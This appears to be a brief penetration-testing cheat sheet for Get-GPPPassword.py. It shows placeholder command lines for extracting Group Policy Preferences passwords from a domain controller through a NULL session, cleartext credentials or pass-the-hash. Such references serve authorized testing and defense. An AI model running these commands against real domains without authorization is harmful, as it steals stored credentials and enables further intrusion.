# Get-GPPPassword

## Get-GPPPassword - with a NULL session
```
Get-GPPPassword.py -no-pass '<DC>'
```
# Get-GPPPassword - with cleartext credentials
```
Get-GPPPassword.py '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```
# Get-GPPPassword - pass-the-hash
```
Get-GPPPassword.py -hashes '<HASH>' '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```